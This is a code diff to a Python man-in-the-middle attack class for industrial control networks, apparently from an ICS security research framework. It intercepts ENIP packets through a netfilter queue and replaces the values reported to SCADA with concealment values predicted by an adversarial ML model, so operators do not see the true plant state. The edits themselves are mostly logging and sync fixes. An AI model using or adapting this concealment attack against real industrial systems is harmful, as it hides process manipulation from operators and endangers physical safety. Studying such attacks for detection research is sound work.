@@ -116,18 +116,22 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
             # flag = 0 means a physical process finished a new iteration
             while not self.get_sync(0):
                 if self.sync_thread_flag:
+                    #self.logger.debug('Thread sync flag is: ' + str(self.sync_thread_flag) )
                     pass
                 else:
                     break
 
             # We have to keep the same state machine as PLCs
             self.set_sync(1)
+            self.logger.debug('Sync flat set in 1')
 
             while not self.get_sync(2):
                 if self.sync_thread_flag:
                     pass
                 else:
                     break
+
+            self.logger.debug('Keeping attack sync in 2, until we get all SCADA flags')
 
             # We stay in 2, to conceal the values exchanged remotely from the PLCs, until we make a prediction
             while self.missing_scada_tags:
@@ -136,8 +140,10 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
                 else:
                     break
 
+            self.logger.debug('Setting attack sync in 3')
             self.set_sync(3)
 
+        self.set_sync(3)
 
     def set_initial_conditions_of_scada_values(self):
         zero_values = [[0] * len(self.scada_tags)] * self.window_size
@@ -160,15 +166,11 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
 
         self.calculated_concealment_values_df = self.advAE.predict(self.received_scada_tags_df)
 
-        #received_window_size
-        #zero_values = [[42] * len(self.scada_tags)] * self.window_size
-        #self.calculated_concealment_values_df = pd.DataFrame(columns=self.scada_tags, data=zero_values)
-
         self.logger.debug('predicting')
 
     def handle_concealment(self, session, ip_payload):
 
-        self.logger.debug('Concealing method for session: ' + str(session))
+        #self.logger.debug('Concealing method for session: ' + str(session))
 
         if len(self.missing_scada_tags) == len(self.scada_tags):
             # We miss all the tags. Start of a new prediction cycle
@@ -176,7 +178,7 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
             self.predicted_for_iteration = False
 
         #aux_tags = list(self.scada_tags)
-        self.logger.debug('Missing tags are: ' + str(self.missing_scada_tags))
+        #self.logger.debug('Missing tags are: ' + str(self.missing_scada_tags))
         #self.logger.debug('SCADA tags are: ' + str(self.scada_tags))
         #self.logger.debug('Missing tags len: ' + str(len(self.missing_scada_tags)))
         #self.logger.debug('SCADA tags len: ' + str(len(self.scada_tags)))
@@ -185,7 +187,7 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
             # We store the value, this df is an input for the concealment ML model
             self.received_scada_tags_df[session['tag']].iloc[self.received_window_size] = translate_payload_to_float(ip_payload[Raw].load)
             #self.logger.debug('Received tag ' + str(session['tag']) + ' with value: ' +
-            #                  str(self.received_scada_tags_df[session['tag']].iloc[-1]))
+            #str(self.received_scada_tags_df[session['tag']].iloc[-1]))
             self.missing_scada_tags.remove(session['tag'])
             #self.logger.debug('Missing tags len after removing: ' + str(len(self.missing_scada_tags)))
 
@@ -193,7 +195,7 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
             if not self.missing_scada_tags:
 
                 # Wait for sync to take place
-                while not self.get_sync(3):
+                while not self.get_sync(3) and self.sync_thread_flag:
                     pass
 
                 self.missing_scada_tags = list(self.scada_tags)
@@ -202,10 +204,12 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
                     self.received_window_size = self.received_window_size + 1
                     if self.received_window_size >= self.window_size - 1:
                         self.initialized = True
+                        self.logger.debug('Adversarial Model initialized')
 
                 elif not self.predicted_for_iteration:
-                    self.predicted_for_iteration = True
                     self.predict_concealment_values()
+                    self.logger.debug('Concealment values predicted')
+                    self.predicted_for_iteration = True
 
         # If model is initialized, we have to conceal, regardless of missing set
         if self.initialized:
@@ -230,7 +234,7 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
             # Concealment values to SCADA
             for session in self.scada_session_ids:
                 if session['session'] == this_session and session['context'] == this_context:
-                    self.logger.debug('Concealing to SCADA: ' + str(this_session))
+                    #self.logger.debug('Concealing to SCADA: ' + str(this_session))
                     return self.handle_concealment(session, ip_payload)
 
         except Exception as exc:
@@ -267,6 +271,7 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
 
         try:
             p = IP(packet.get_payload())
+            #self.logger.debug('packet')
             if 'TCP' in p:
                 if len(p) == 102:
                     p[Raw].load, modified = self.handle_enip_response(p)
@@ -355,6 +360,6 @@ if __name__ == "__main__":
     attack = UnconstrainedBlackBoxMiTMNetfilterQueue(
         intermediate_yaml_path=Path(args.intermediate_yaml),
         yaml_index=args.index,
-        queue_number = args.number)
+        queue_number=args.number)
     attack.main_loop()
 
